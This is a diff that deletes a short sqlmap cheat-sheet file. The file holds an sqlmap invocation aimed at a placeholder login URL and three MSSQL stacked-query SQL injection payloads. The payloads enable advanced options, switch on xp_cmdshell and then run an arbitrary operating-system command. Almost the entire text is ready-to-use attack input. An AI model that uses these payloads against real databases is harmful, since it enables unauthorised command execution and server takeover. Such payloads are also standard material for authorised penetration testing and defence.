@@ -1,9 +1,0 @@
-% sqlmap
-
-# get
-sqlmap --purge -u 'http://<URL>?uname=test&psw=test' --time-sec=10
-
-# stacked queries mssql
-test'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
-test'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
-test'; EXEC xp_cmdshell '<CMD>';--
